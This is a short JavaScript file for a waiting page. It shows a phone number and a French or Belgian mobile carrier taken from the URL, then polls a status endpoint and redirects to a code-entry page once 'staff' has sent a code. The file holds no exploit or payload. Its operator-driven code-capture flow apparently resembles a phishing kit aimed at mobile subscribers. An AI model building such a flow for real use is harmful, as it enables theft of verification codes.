const API_STATUS = '/api/status';

function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
}

const phone = getParam('phone') || '--';
const carrier = getParam('carrier') || 'Orange';

document.getElementById('displayPhone').textContent = phone;

// Mapping opérateur → nom affiché
const carrierNames = {
    'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
    'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
};
document.getElementById('carrierName').textContent = carrierNames[carrier] || carrier;

// Polling du statut toutes les 3 secondes
async function checkStatus() {
    try {
        const res = await fetch(`${API_STATUS}?phone=${encodeURIComponent(phone)}`);
        if (!res.ok) return;
        const data = await res.json();

        if (data.status === 'waiting_code') {
            // Le staff a envoyé le code, on redirige
            window.location.href = `code.html?phone=${encodeURIComponent(phone)}`;
        } else if (data.status === 'completed') {
            window.location.href = `success.html?phone=${encodeURIComponent(phone)}`;
        }
    } catch (e) {
        console.error('Polling error:', e);
    }
}

// Démarrer le polling
checkStatus();
setInterval(checkStatus, 3000);
